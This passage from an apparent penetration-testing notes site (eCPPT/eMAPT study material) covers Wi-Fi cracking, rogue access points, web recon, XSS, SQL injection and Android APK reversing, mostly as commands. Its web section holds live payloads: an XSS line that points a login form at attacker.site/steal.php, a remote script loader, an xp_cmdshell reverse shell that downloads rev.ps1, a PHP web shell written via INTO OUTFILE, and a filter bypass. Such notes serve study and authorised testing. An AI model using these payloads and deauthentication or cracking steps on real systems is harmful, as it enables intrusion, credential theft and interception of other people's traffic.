set channel 11\n\n\n# Increase Maximum Transit Power of a Wireless Adapter\n$ iw reg set BO                               # Set to Bolivia\n$ iw dev wlan0 set txpower fixed 30dbm        # Set power to 30dbm\n$ iwconfig wlan0                              # Check\n\n\n\n# Set-Up Monitor Mode Interface on wlan0\n$ airmon-ng start wlan0\n$ airmon-ng stop wlan0\n$ iwconfig mon0                             \n\n\n# Kill programs which block wireless interface and forbid changing parameters\n$ airmon-ng check kill\n\n\n\n# Check if everything is working fine\n$ aireplay-ng -9 mon0\n</code></pre>"},{"location":"eCPPT%20Materials/WIFI%20Security/#wireless-standards-and-networks","title":"Wireless Standards and Networks","text":"<pre><code># IEEE 802.11 starnarts\n    802.11 (Legacy)     -    2.4 GHz\n    802.11a             -    5 GHz \n    802.11b             -    2.4 GHz \n    802.11g             -    2.4 GHz \n    802.11n             -    2.4/5 GHz \n\n\n# Type of Wireless Networks\n    Infrastructure Network\n    Ad-Hoc Network\n\n\n# Authentication Modes\n    Open Authentication\n    Shared Key Authentication (SKA)\n</code></pre>"},{"location":"eCPPT%20Materials/WIFI%20Security/#discover-wi-fi-networks","title":"Discover Wi-Fi Networks","text":"<p>Tools <pre><code># InSSIDer - Windows\n# https://www.metageek.com/\n\n\n-------------------------------------------------------------------------------\n\n\n# Kismet - Linux\n# https://www.kismetwireless.net/\n\n$ kismet -c &lt;mon_interface&gt;                          # Start sniffing\n\n\n-------------------------------------------------------------------------------\n\n# Airodump-ng  - Linux\n\n$ airodump-ng &lt;mon_interface&gt;\n$ airodump-ng -c 1,6,11 &lt;mon_interface&gt;           # Listen only 1,6,11 Channels\n$ airodump-ng -w &lt;filename&gt; &lt;mon_interface&gt;       # Capture to .cap file\n$ airodump-ng  -c &lt;chanell&gt; --bssid &lt;BSSID&gt; &lt;mon_interface&gt;\n$ airodump-ng -t wep &lt;mon_interface&gt;              # Capture only WEP network\n</code></pre></p> <p>Hidden Networks <pre><code># Wireshark - Beacom Frames\nwlan[0]== 0x80\n\n# Wireshark - Probe Responses\nwlan.fc.type_subtype == 0x05\n\n-------------------------------------------------------------------------------\n\n$ kismet -c &lt;mon_interface&gt;                    # Capture Networks\n\n# Send Deauth packets to get Hidden network SSID through Probe Responses\n$ aireplay-ng -0 &lt;num&gt; -c &lt;client_mac&gt; -a &lt;BSSID&gt; &lt;mon_interface&gt;\n\n# Check on kismet Hidden network SSID or filter Wireshark as follow\nwlan.fc.type_subtype == 0x05\n</code></pre></p>"},{"location":"eCPPT%20Materials/WIFI%20Security/#traffic-analysisdecrypt","title":"Traffic Analysis/Decrypt","text":"<pre><code># Capture Frames to .cap file\n$ airodump-ng -w &lt;outputfile&gt; &lt;mon_interface&gt;\n\nwlan.fc.type_subtype != 0x08               # Filter Frames except Beacon frames\nwlan.bssid == &lt;BSSID&gt;                      # Filter by AP MAC address\nwlan.fc.type_subtype == 0x02               # Get Data Frames\nwlan.fc.type_subtype == 8                  # Get Network SSID\n\n\n-------------------------------------------------------------------------------\n\n\n\n# Traffic Decryption - Wireshark\n&gt; Edit &gt; Preferences &gt; Protocols &gt; IEEE 802.11 &gt; Edit Decryption Keys\n&gt; WEP - Hexademical Key\n&gt; WPA - Key:SSID\n\n\n# Traffic Decryption - Airdecap-ng \n$ airdecap-mg -w &lt;wep_key_in_hex&gt; &lt;.cap&gt;                   # Decrypt WEP\n$ airdecap-mg -p &lt;wpa_passphrase&gt; -e &lt;SSID&gt; &lt;.cap&gt;         # Decrypt WPA\n\n\n# Maintian IEEE 802.11 flags after decryption\n$ airdecap-mg -w &lt;wep_key_in_hex&gt; &lt;.cap&gt; -1                 # Decrypt WEP\n\n\n\nNOTE: Only traffic that was captured after the handshake can be decrypted\n\nNOTE: Take attention to get 4 way handshake\n\n\n\n\n\n-------------------------------------------------------------------------------\n\n# Setup\n1. airmon-ng check kill\n2. airmon-ng start wlan0\n3. airodump-ng wlan0mon -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;filename&gt;\n4. aireplay-ng -0 &lt;num&gt;  -c &lt;client_mac&gt; -a &lt;BSSID&gt; wlan0mon\n5. airdecap-mg -p &lt;wpa_passphrase&gt; -e &lt;SSID&gt; &lt;filename.cap&gt;\n6. Open in Wireshark\n</code></pre>"},{"location":"eCPPT%20Materials/WIFI%20Security/#attacking-wi-fi-networks","title":"Attacking Wi-Fi Networks","text":""},{"location":"eCPPT%20Materials/WIFI%20Security/#wep","title":"WEP","text":"<p>Increment the packet rate of  <code>#Data</code> and <code>#/s</code>/s Columns on Airodump-ng <pre><code>$ airodump-ng wlan0mon -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;filename&gt;   # Listen\n\n\n1. Deauthentication Attack\n2. ARP Replay Attack\n</code></pre></p> <p>ARP Replay - Fake Authentication -  Increment the packet rate <pre><code>$ aireplay-ng -1 &lt;delay_between_authentication&gt; -a &lt;bssid&gt; -e &lt;essid&gt; &lt;intf&gt;\n$ aireplay-ng -1 15 -a &lt;bssid&gt; -e &lt;essid&gt; &lt;intf&gt;\n</code></pre></p> <p>ARP Replay - Troubleshooting/Picky AP - Increment the packet rate <pre><code>$ aireplay-ng -1 6000 -q 10 -o 1 -a &lt;bssid&gt; -e &lt;essid&gt; &lt;intf&gt;\n    -q = Keep-Alive Packets\n    -o = Send one set of packets at atime\n</code></pre></p> <p>Listen for ARP requests send by clients to the network <pre><code>$ aireplay-ng -3 -b &lt;bssid&gt; &lt;intf&gt;\n</code></pre></p>"},{"location":"eCPPT%20Materials/WIFI%20Security/#-","title":"---","text":"<p>WEP Cracking with <code>aircrack-ng</code> <pre><code>$ aircrack-ng -n &lt;key_lenght&gt; &lt;.cap file(s)&gt;\n$ aircrack-ng -e &lt;ssid&gt; &lt;.cap file(s)&gt;\n</code></pre></p> <p>Clientless WEP cracking <pre><code>1. Capture data\n$ airodump-ng wlan0mon -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;filename&gt; \n\n\n2. Authenticating to the AP - Fake Authentication\n$ aireplay-ng -1 6000 -q 10 -a &lt;bssid&gt; &lt;interface&gt;\n\n\n3. Aireplay-ng Fragmentation Attack\n$ aireplay-ng -5 -b &lt;bssid&gt; -c &lt;source_mac&gt; &lt;interface&gt; \n    -5 = indicates the fragmentation attack\n    -c = attacker wireless adapter MAC\n\n\n4. Build ARP request packet with captured PRGA\n$ packetforge-ng -0 -a &lt;bssid&gt; -h &lt;attacker_mac&gt; -k &lt;ip1&gt; -l &lt;ip2&gt; -y &lt;prga.xor&gt; -w outfile\n$ packetforge-ng -0 -a &lt;bssid&gt; -h &lt;attacker_mac&gt; -k 255.255.255.255 -l 255.255.255.255 -y &lt;prga.xor&gt; -w packet_file\n\n\n5. Inject the forged ARP requests\n$ aireplay-ng -2 -r &lt;packet_file&gt; &lt;interface&gt;\n\n\n\n6. If everything works fine airodump-ng will generate new traffic and gather IV. Then use aircrack-ng as previously seen.\n</code></pre></p> <p>Bypassing Shared key Authetication <pre><code>1. Capture data\n$ airodump-ng wlan0mon -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;filename&gt; \n\n\n2. Send Deauth frames\n$ aireplay-ng -0 &lt;num&gt; -c &lt;client_mac&gt; -a &lt;BSSID&gt; &lt;mon_interface&gt;\n\n3. On airodump-ng windows, \"keystream\" message should be visible, which is saved to .xor file.\n\n4. Fake authentication attack\n$ aireplay-ng -1 6000 -q 10 -e &lt;ssid&gt; -y &lt;file.xor&gt; &lt;interface&gt;\n\n5. ARP replay attack\n$ aireplay-ng -3 -b &lt;bssid&gt; &lt;intf&gt;\n</code></pre></p> <p>Attacking the client - Caffe-Latte attack <pre><code># Assume that Conditions :\n    - Target network AP is switched off or out of range\n    - A Client with a pre-configured WEP Key for the targer network\n    - Another device that use as an attack point\n\n\n1. Capture data\n$ airodump-ng wlan0mon -c &lt;channel&gt; -w &lt;filename&gt; \n\n2. Caffe-Late attack\n$ airbase-ng -c &lt;channel&gt; -W 1 -L -e &lt;SSID&gt; &lt;interface&gt;\n    -L = enable Cafe-Latte attack\n    -e = act as an AP for the specified SSID\n    -c = fixes channel\n    -W = force airbase-ng to net set the WEP Privacy bit in beacon\n\n3. Wait to get sufficient amount of packets, then use aircrack-ng \n</code></pre></p>"},{"location":"eCPPT%20Materials/WIFI%20Security/#-_1","title":"---","text":""},{"location":"eCPPT%20Materials/WIFI%20Security/#wpawpa2","title":"WPA/WPA2","text":"<p>Capture the Handshake <pre><code># Capture Packets/Handshake\n$ airodump-ng wlan0mon -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;filename&gt;\n\n\n# Deauthenticate client \n$ aireplay-ng -0 &lt;num&gt; -c &lt;client_mac&gt; -a &lt;BSSID&gt; &lt;mon_interface&gt;\n\n\n# Crack Handshake - Aircrack-ng\n$ aircrack-ng -w &lt;wordlist(s)&gt; &lt;.cap file&gt;            # Dictionary Attack\n$ aircrack-ng -S                                      # Benchmark\n</code></pre></p> <p>Capture PMKID</p> <pre><code># install hcxdumptool\ngit clone https://github.com/ZerBea/hcxdumptool\ncd hcxdumptool/\nmake\nsudo make install\ncd .. # up\n\n# install hcxtools\nsudo apt install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev\ngit clone https://github.com/ZerBea/hcxtools\ncd hcxtools /\nmake\nsudo make install\ncd ..\n\n\n-------------------------------------------------------------------------------\n\n# Capture PMKID\n$ ./hcxdumptool -i &lt;interface&gt; --rds=1 -w &lt;captured.pcapng&gt;\n\n# Convert pcapng to Hashcat format\n$ ./hcxpcapngtool -o hash.22000 &lt;captured.pcapng&gt;\n&gt; https://hashcat.net/cap2hashcat/\n\n# Verify Hash SSIDs\n$ ./hcxhashtool -i &lt;hash.22000&gt; -E stdout\n\n# Crack with hashcat\n$ hashcat -m 22000 hash.2200 &lt;wordlist&gt;\n</code></pre> <p>Crunch <pre><code>$ crunch &lt;min_lenght&gt; &lt;max_lenght&gt; -o my_wordlist.lst\n\n$ crunch 8 8 | aircrack-ng -e &lt;SSID&gt; &lt;.cap file&gt; -w -\n</code></pre></p> <p>Hashcat <pre><code># Convert .cap file to .hccapx\n- https://hashcat.net/cap2hashcat/\n- hcxpcapngtool -o hash.22000 &lt;captured.pcapng&gt;\n\n\n# Crack with Hashcat\n$ hashcat -m 22000 &lt;hash.22000&gt; &lt;wordlist&gt;\n\n\n\nNOTE : oclhashcat is used for AMD/ATI GPUs, cudahashcat is used for NVIDIA GPUs\n</code></pre></p> <p>Hashcat as a service <pre><code>https://www.onlinehashcrack.com/\n</code></pre></p> <p>Pyrit <pre><code>$ pyrit eval                                        # Check database status\n$ pyrit -i &lt;wordlist_file&gt; import_passwords         # Import Passwords\n$ pyrit -e &lt;SSID&gt; create_essid                      # Provied SSID\n$ pyrit eval                                        # Check Database status\n$ pyrit batch                                       # Start Building Database\n$ pyrit -r &lt;.cap file&gt; attack_db                    # Attack/Crack\n\n\n\n\n# Pre Build Databases with 1000 frequently used SSIDs\nhttps://www.renderlab.net/projects/WPA-tables/\n</code></pre></p>"},{"location":"eCPPT%20Materials/WIFI%20Security/#-_2","title":"---","text":""},{"location":"eCPPT%20Materials/WIFI%20Security/#wps","title":"WPS","text":"<pre><code># List of WPS enabled APs\nwash -i &lt;interface&gt;\n\n\n# Crack WPS - Bully\n$ bully -b &lt;BSSID&gt; -c &lt;channel&gt; &lt;interface&gt;\n$ bully -b &lt;BSSID&gt; -c &lt;channel&gt; -1 &lt;sec&gt; -2 &lt;sec&gt; &lt;interface&gt;\n$ bully -b &lt;BSSID&gt; -c &lt;channel&gt; -1 60 -2 60 &lt;interface&gt;          # Delay\n$ bully &lt;interface&gt; -b &lt;BSSID&gt; -c &lt;channel&gt; -S -F -B -v 3        # Hacktricks\n\n\n# Crack WPS - Reaver\n$ reaver -i &lt;interface&gt; -b &lt;BSSID&gt; -c &lt;channel&gt; -vv\n$ reaver -i &lt;interface&gt; -b &lt;BSSID&gt; -c &lt;channel&gt; -vv -d 60        # Delay\n$ reaver -i &lt;interface&gt; -b &lt;BSSID&gt; -c &lt;channel&gt; -b -f -N [-L -d 2] -vvroot  # Hacktricks\n</code></pre>"},{"location":"eCPPT%20Materials/WIFI%20Security/#-_3","title":"---","text":""},{"location":"eCPPT%20Materials/WIFI%20Security/#wi-fi-as-attack-vectors","title":"Wi-Fi as Attack Vectors","text":"<p>WEP - Rouge AP / Recover Keystream <pre><code># Putting Wireless Adapter into Monitor Mode\n$ airmon-ng start &lt;intf&gt;\n\n\n# Capture packets / Dump the incoming keystreams to a file\n$ airodump-ng  -c &lt;channel&gt; -w &lt;outfile&gt; &lt;mon_interface&gt;\n\n\n# Spoof SSID\n$ airbase-ng -c &lt;channel&gt; -e &lt;SSID&gt; -s -W 1 &lt;intf&gt;\n    -s = force shared key authentication\n    -W = set WEP flag in beacons\n\n\n# When client connects to our Rouge AP, we recieve Keystreams stored in .xor file.\n</code></pre></p> <p>WPA/WPA2 - Rogue AP / Capture Handshake <pre><code># Putting Wireless Adapter into Monitor Mode\n$ airmon-ng start &lt;intf&gt;\n\n\n# Capture Packets/Handshake\n$ airodump-ng  -c &lt;channel&gt; -w &lt;outfile&gt; &lt;mon_interface&gt;\n\n\n# Spoof SSID\n$ airbase-ng -c &lt;channel&gt; -e &lt;SSID&gt; -W 1 -Z 4 &lt;intf&gt;\n    -W = set WEP flag in beacons\n    -Z = Set WPA2 with CCMP encryption\n\n\n\n# When client tricked to connect our Rouge AP, we recieve Handshake stored in .cap file.\n</code></pre></p> <p>Man in the Middle Attack</p> <pre><code># Put Wirekess interface to Monitor mode\n$ airmon-ng start &lt;intf&gt;\n\n\n# Start/Set-up Access Point\n$ airbase-ng -c &lt;channel&gt; -e \"Free Internet\" &lt;intf&gt;\n\n\n# Create a Network Bridge Interface\n$ apt-get install bridge-utils                  # brctl: Command not found\n$ brctl addbr br0\n$ brctl addif br0 eth0\n$ brctl addif br0 at0\n\n&gt; br0  = bridge interface\n&gt; eth0 = attacker wired interface\n&gt; at0  = virtual interface created by airbase-ng\n\n\n# Assign IP Address to bridged interface\n{\n$ ifconfig eth0 0.0.0.0 up\n$ ifconfig at0 0.0.0.0 up\n}\n$ ifconfig br0 &lt;ip_address&gt; up\n\n\n# Enable Port-Forwarding\n$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n\n\n# Capture Packets/Data\n&gt; Wireshark\n&gt; Tcpdump\n  tcpdump -nvi &lt;intf&gt; tcp port 80 -A\n</code></pre> <p>Evil Twins Attack</p> <pre><code># https://github.com/sensepost/mana\n\n$ apt install mana-toolkit                   # Linux Install\n$ /usr/share/mana-toolkit/run-mana/          # Mana Scripts\n$ /etc/mana-toolkit/hostapd-mana.conf        # Configuration File\n$ /usr/share/mana-toolkit/www/portal         # Location of Landing Page\n\n\n-----------------------------------------\n\n# Metasploit - Fake DNS\nmsf &gt; use auxiliary/server/fakedns\nmsf &gt; SET TARGETACTION FAKE\nmsf &gt; SET TARGETDOMAIN *\nmsf &gt; SET 10.0.0.1\nmsf &gt; exploit -j\n\n-----------------------------------------\n\n\n\n\nNOTE : Upon Deauthentication of the client, the client should auto-reconnect to the AP with the stronger signal ( The attacker controlled AP )\n</code></pre> <p>WPA2-Enterprise <pre><code># https://github.com/s0lst1c3/eaphammer\n</code></pre></p> <p>Wardriving <pre><code># https://play.google.com/store/apps/details?id=net.wigle.wigleandroid&amp;hl=en\n\n# https://wigle.net/\n</code></pre></p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/","title":"Web App Security","text":""},{"location":"eCPPT%20Materials/Web%20App%20Security/#information-gathering","title":"Information Gathering","text":""},{"location":"eCPPT%20Materials/Web%20App%20Security/#gathering-information","title":"Gathering Information","text":"<p>Whois <pre><code>&gt; whois google.com                                # Linux\n&gt; whois.exe google.com                            # Windows\n</code></pre></p> <p>Netcraft <pre><code>https://sitereport.netcraft.com/\n</code></pre></p> <p>IP Resolve <pre><code>dig domain.com\n</code></pre> <pre><code>nslookup domain.com\n</code></pre></p> <p>Nameserver lookup <pre><code>dig domain.com NS\n</code></pre> <pre><code>nslookup -type=NS domain.com\n</code></pre></p> <p>Reverse DNS lookup <pre><code>dig domain.com PTR\n</code></pre> <pre><code>nslookup -type=PTR domain.com\n</code></pre></p> <p>Mail Exchange lookup <pre><code>dig domain.com MX\n</code></pre> <pre><code>nslookup -type=MX domain.com\n</code></pre></p> <p>Zone transfers <pre><code>dig axfr @DNS_IP domain.com\n</code></pre> <pre><code>nslookup\n&gt; server [nameserver for domain.com]\n&gt; 1s -d domain.com\n</code></pre></p> <p>DNS Tools <pre><code>fierce --domain domain.com \n</code></pre> <pre><code>fierce --domain domain.com --dns-servers {IP}\n</code></pre></p> <p><pre><code>dnsenum domain.com\n</code></pre> <pre><code>dnsenum domain.com --dnsserver {DNS IP}\n</code></pre> <pre><code>dnsenum domain.com -f {subdomain file}\n</code></pre></p> <p><pre><code>dnsmap domain.com\n</code></pre> <pre><code>dnsmap domain.com -w {subdomain file}\n</code></pre></p> <p><pre><code>dnsrecon -d domain.com\n</code></pre> <pre><code>dnsrecon -d domain.com -n {NS IP}\n</code></pre> <pre><code>dnsrecon -d domain.com -{scan option}\n</code></pre></p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#infrastructure","title":"Infrastructure","text":"<p>Fingerprint WebServer <pre><code># Netcraft\nhttps://sitereport.netcraft.com/\n\n\n\n# NetCat\n&gt; nc domain.com 80\n&gt; HEAD / HTTP/1.0\n\n\n# WhatWeb\n&gt; whatweb domain.com\n&gt; whatweb -v domain.com\n&gt; whatweb -a 3 -v domain.com\n\n\n# httprint\n</code></pre></p> <p>Enumerating Subdomains <pre><code># Enumerate Subdomains with netcraft\nhttps://searchdns.netcraft.com/\n\n\n-------------------------------------------------------------------------------\n\n# Enumerate Subdomains with Google\nGoogle &gt; site:.domain.com                            # Search Subdomains\nGoogle &gt; site:.domain.com -inurl:www.                # Search Without www.\n\n\n\n-------------------------------------------------------------------------------\n\n\n# Enumerate Subdomains with Tools\n&gt; dnsrecon -h\n&gt; dnsrencon -d domain.com -g                         # Perform Google Enum\n\n\n&gt; theharvester -d domain.com -b all                  # Subdomain Enum \n\n\n-------------------------------------------------------------------------------\n\n\n# Enumerating Subdomains with Zone Transfers\n&gt; nslookup -type=NS domain.com                     # Find Nameservers\n&gt; nslookup\n&gt; server [NAMESERVER]\n&gt; 1s -d domain.com\n\n\n&gt; dig axfr domain.com @NAMESERVER\n\n\n-------------------------------------------------------------------------------\n</code></pre></p> <p>Finding Virtual Hosts <pre><code>fierce -dns domain.com\n</code></pre></p> <p>Fingerprinting Frameworks and Applications Fingerprinting Third-Party Add-Ons Mapping Attack Surface     Client Side Validation     Database Interaction     File Uploading and Downloading     Display of User Supplied Data     Redirections     Access Controls and Login Protected Pages     Error Messages     Charting</p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#enumerating-resources","title":"Enumerating Resources","text":"<p>Crawling with Burp Suite</p> <p>Finding Hidden Data <pre><code># List of Backup file extensions\n1. bak\n2. bac\n3. old\n4. 000\n5. ~\n6. 01\n7. _bak\n8. 001\n9. inc\n10. Xxx\n\n\n# On ASP.net based framework .inc is used. \n\n\n# Configuration Files Source Code View Examples\n1. configuration.php.bak\n2. configuration.php.old\n3. ...\n\n\n\n# Check Availability of PUT request\n&gt; curl -X OPTIONS domain.com\n\n\n# Guess writable folder to use PUT method include folders where user supplied files are stored.\n</code></pre></p> <p>Google Hacking <pre><code>https://www.exploit-db.com/google-hacking-database\n</code></pre></p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#cross-site-scripting","title":"Cross Site Scripting","text":"<pre><code># Change Page Content\n&lt;script&gt;document.body.innerHTML=\"&lt;h1&gt;HACKED&lt;/h1&gt;\";&lt;/script&gt;\n\n\n# XSS Phishing on Login Page\n&lt;script&gt;document.form[0].action=\"htpps://attacker.site/steal.php\";&lt;/script&gt;\n\n\n# Create Element with Remote JS File\n&gt; var s = document.createElement('SCRIPT');\n&gt; s.src = '//attacker.site/alert.js';\n&gt; document.body.appendChild(s);\n</code></pre>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#sql-injection","title":"SQL Injection","text":"<p>SQLmap <pre><code># Basic Syntax\n&gt; sqlmap -u &lt;URL&gt; -p &lt;injection parameter&gt; [options]\n\n\n# Basic Post Requiest Injection\n&gt; sqlmap -u &lt;URL&gt; --data=&lt;POST string&gt; -p &lt;parameter&gt; [options]\n\n\n# Specify File\n&gt; sqlmap -r &lt;request file&gt; -p &lt;parameter&gt; [options]\n\n\n# Retrieve Banner\n&gt; sqlmap -u &lt;URL&gt; --banner \n\n\n# List Users of Database\n&gt; sqlmap -u &lt;URL&gt; --users \n\n\n# Check if User is Administrator\n&gt; sqlmap -u &lt;URL&gt; --is-dba \n\n\n# List All of the Databases\n&gt; sqlmap -u &lt;URL&gt; --dbs\n\n\n# List Tables\n&gt; sqlmap -u &lt;URL&gt; -D &lt;database&gt; --tables\n\n\n# List Columns\n&gt; sqlmap -u &lt;URL&gt; -D &lt;database&gt; -T &lt;table&gt; --columns\n\n\n# Dump Table\n&gt; sqlmap -u &lt;URL&gt; -D &lt;database&gt; -T &lt;table&gt; -C &lt;column&gt; --dump\n\n\n# Specify DBMS\n&gt; sqlmap -u &lt;URL&gt; --dbms=&lt;DBMS&gt;\n\n\n# Append String which is always resented in output\n&gt; sqlmap -u &lt;URL&gt; --string \"johnDoe\"\n\n\n# If injected payload needs to end with '));\n&gt; sqlmap -u &lt;URL&gt; --suffix \"'));\"\n\n\n# Persistent Connections To Dump Bounch of Data\n&gt; sqlmap -u &lt;URL&gt; --keep-alive \n\n\n# Reduce Dumping Phase Time\n&gt; sqlmap -u &lt;URL&gt; --threads &lt;1-10&gt;\n\n\n# Level Attribute\n* Level 2 = The Cookie Header\n* Level 3 = The User Agent and Referrer\n* Level 5 = The Host\n\n\n# Risk Attribute\n* Level 1 - Innocous Inejctions (Default)\n* Level 2 - Enables Heavy Time-Based Injections\n* Level 3 - Enables OR-Based Injections\n</code></pre></p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#server-takeover","title":"Server Takeover","text":"<p>SQL Server <pre><code># Username + Password + CMD command\ncrackmapexec mssql -d &lt;Domain name&gt; -u &lt;username&gt; -p &lt;password&gt; -x \"whoami\"\n# Username + Hash + PS command\ncrackmapexec mssql -d &lt;Domain name&gt; -u &lt;username&gt; -H &lt;HASH&gt; -X '$PSVersionTable'\n\n# Check if xp_cmdshell is enabled\nSELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';\n\n# This turns on advanced options and is needed to configure xp_cmdshell\nsp_configure 'show advanced options', '1'\nRECONFIGURE\n#This enables xp_cmdshell\nsp_configure 'xp_cmdshell', '1'\nRECONFIGURE\n\n#One liner\nsp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n\n# Quickly check what the service account is via xp_cmdshell\nEXEC master..xp_cmdshell 'whoami'\n\n# Get Rev shell\nEXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.13:8000/rev.ps1\") | powershell -noprofile'\n\n# Bypass blackisted \"EXEC xp_cmdshell\"\n'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' \u2014\n\n\n-------------------------------------------------------------------------------\n\n# Get Username and Password hash\n&gt; SELECT name, password FROM master..sysxlogins\n&gt; SELECT name, password_hash FROM master..sys.sql_logins\n\n\n# Port Scanning\n&gt; SELECT * from OPENROWSET('SQLOLEDB', 'uid=sa;pwd=something,Network=DBMSSOCN;Address=&lt;Target IP&gt;,&lt;Target PORT&gt;;timeout=&lt;connection timeout in secconds&gt;', 'select 1')-- \n\n\n# Read file and Save output of command on a web accessible folder\n&gt; EXEC master..xp_cmdshell 'dir C:\\ &gt; C:\\inetpub\\wwwroot\\site\\dir.txt'--\n\n\n# Read file and puts its content into a table.\n&gt; CREATE TABLE filecontent(line varchar(8000));\n&gt; BULK INSERT filecontent FROM '&lt;target_file&gt;';\n\n\n# Upload file to the victim Server\n1. Insert the file into a table in MS SQL database under our control\n    &gt; CREATE TABLE HelperTable (file text)\n    &gt; BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')\n1. Force the target DB server to retrieve it from our server\n    &gt; EXEC xp_cmdshell 'bcp \"SELECT * FROM HelperTable\" queryout shell.exe -c -Craw -S&lt;out server address&gt; -U&lt;out server username&gt; -P&lt;out server password&gt;'\n</code></pre></p> <p>MySQL <pre><code># Read File\n&gt; select load_file('/etc/passwd');\n\n# Write to a file\n&gt; select 1,2,\"&lt;?php echo shell_exec($_GET['c']);?&gt;\",4 into OUTFILE 'C:/xampp/htdocs/back.php'\n\n\n# Write the result of a query to a file\n&gt; select &lt;field&gt; from &lt;table&gt; into dumpfile '&lt;output file path&gt;';\n\n\n# Execution Shell Commands - User Defined Functions (UDF)\n&gt; sqlmap -u &lt;URL&gt; --os-cmd\n&gt; sqlmap -u &lt;URL&gt; --os-shell\n</code></pre></p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#common-web-attacks","title":"Common Web Attacks","text":"<p>Session Files <pre><code># PHP Session stored within the folder specified by the php.ini entry - sesion.save_path.\n# PHP session file name example - sess_&lt;session_id&gt;\n\n-------------------------------------------------------------------------------\n\n# Java - Tomcat sessions stored in SESSIONS.ser \n</code></pre></p> <p>Session Fixation <pre><code># Session fixation exist if the server identifier(session) remains the same after successfuly login\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/","title":"Mobile Application Security Testing","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#android-build-process","title":"Android Build Process","text":"<p>In order to inspect the content of APK file, first need to change its extension to .ZIP and then decompress it.</p> <p>Once decompressed, following files and directories revealed  - AndroidManifest.xml - classes.dex - resources.arsc - /assets - /lib - /META-INF - /res - Third-Party libraries, etc...</p> <p>This files holds the keys to most of security topics</p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#signing","title":"Signing","text":"<p>Generate private key using keytool</p> <pre><code>keytool -genkey -v -keystore foo.keystore -keyalg RSA -keysize 2048 -validity 10000 -alias myalias\n</code></pre> <p>Sign APK </p> <pre><code>jarsigner -signalg SHA1withRSA -digestalg SHA1 -keystore foo.keystore test.apk myalias\n</code></pre> <p>Build APK</p> <pre><code>apktool b . #In the folder generated when you decompiled the application\n</code></pre> <p>Inspect the status of signed APK file</p> <pre><code>jarsigner -verify -verbose -certs com.foo.android.activity.apk\n</code></pre> <p>Align APK file due to improve RAM utilization when running the application</p> <pre><code>zipalign -v 4 project_unaligned.apk project.apk\n</code></pre> <p>Convert CERT.RSA to pem ( Human Readable)</p> <pre><code>openssl pkcs7 -inform DER -print_certs -out cert.pem -in CERT.RSA\n</code></pre> <p>See details for the public key in the certificate</p> <pre><code>openssl x509 -in cert.pem -noout -text\n</code></pre> <p>Check file integrity </p> <pre><code>openssl sha1 -binary MANIFEST.MF | openssl base64 \n</code></pre>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#-","title":"---","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#reversing-apks","title":"Reversing APKs","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#apktool","title":"APKTool","text":"<p>Decode .apk file <pre><code>apktool d android.apk\n</code></pre></p> <p>Prevents classes.dex file from being disassembled <pre><code>apktool d android.apk -s\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#dex2jar","title":"Dex2jar","text":"<p>Convert classes.dex file to a .jar file <pre><code>d2j-dex2jar classes.dex -i output_file.jar\n</code></pre></p> <pre><code>d2j-dex2jar android.apk -i output_file.jar\n</code></pre>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#jadx-gui","title":"Jadx-GUI","text":"<p>Decompile APK/JAR/DEX.... <pre><code>jadx-gui &gt; Open File &gt; File\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#assembler-disassembler","title":"Assembler / Disassembler","text":"<p>Dissasemble .dex file <pre><code>d2j-backsmali classes.dex\n</code></pre></p> <p>Assemble source file <pre><code>d2j-smali source_dir/\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#-_1","title":"---","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#network-configuration","title":"Network Configuration","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#burp-proxy-configuration","title":"Burp Proxy Configuration","text":"<p>Set up Proxy <pre><code>adb shell settings put global http_proxy &lt;IP&gt;:&lt;PORT&gt;\n</code></pre></p> <p>Get Proxy List <pre><code>adb shell settings get global http_proxy\n</code></pre></p> <p>Remove Proxy <pre><code>adb shell settings put global http_proxy :0\n</code></pre> <pre><code>adb shell settings delete global http_proxy\n</code></pre></p> <p>OR run emulator the -http-proxy option <pre><code>~/Library/Android/sdk/emulator/emulator -avd &lt;avd_name&gt; -http-proxy &lt;IP&gt;:&lt;PORT&gt;\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#install-proxy-certification","title":"Install Proxy Certification","text":"<p>Export Burp CA </p> <p>Convert .DER to .PEM <pre><code>openssl x509 -inform DER -in &lt;cert.der&gt; -out &lt;cert.pem&gt;\n</code></pre></p> <p>Output the hash with subject_hash_old to rename the .PEM file <pre><code>openssl x509 -inform PEM -subject_hash_old -in &lt;cert.pem&gt; | head -1\n\nmv &lt;cert.pem&gt; &lt;cert&gt;.0\n</code></pre></p> <p>List AVDs <pre><code>~/Library/Android/sdk/emulator/emulator -list-avds\n</code></pre></p> <p>Run AVD with the -writable-system option 